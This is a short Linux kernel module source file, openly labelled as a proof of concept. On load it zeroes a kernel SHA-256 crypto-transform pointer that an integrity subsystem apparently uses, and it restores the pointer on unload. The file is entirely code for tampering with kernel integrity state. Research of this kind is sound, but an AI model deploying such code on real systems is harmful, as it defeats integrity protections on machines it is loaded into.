// SPDX-License-Identifier: GPL-2.0-only
/*
 * Copyright (C) 2026 dere3046
 */

#define POC_NAME "poc_kill_tfm"
#define POC_DESC "inte poc clear g_sha256_tfm"

#include "poc_common.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("dere3046");
MODULE_DESCRIPTION(POC_DESC);

static unsigned long saved_tfm;

static int __init poc_init(void)
{
	int ret;

	ret = poc_init_common();
	if (ret)
		return ret;
	if (!poc_sha256_tfm)
		return -EINVAL;
	saved_tfm = READ_ONCE(*(unsigned long *)poc_sha256_tfm);
	poc_store_word((void *)poc_sha256_tfm, 0);
	poc_info("tfm %lx -> 0", saved_tfm);
	return 0;
}

static void __exit poc_exit(void)
{
	if (poc_sha256_tfm)
		poc_store_word((void *)poc_sha256_tfm, saved_tfm);
	poc_exit_common();
}

module_init(poc_init);
module_exit(poc_exit);
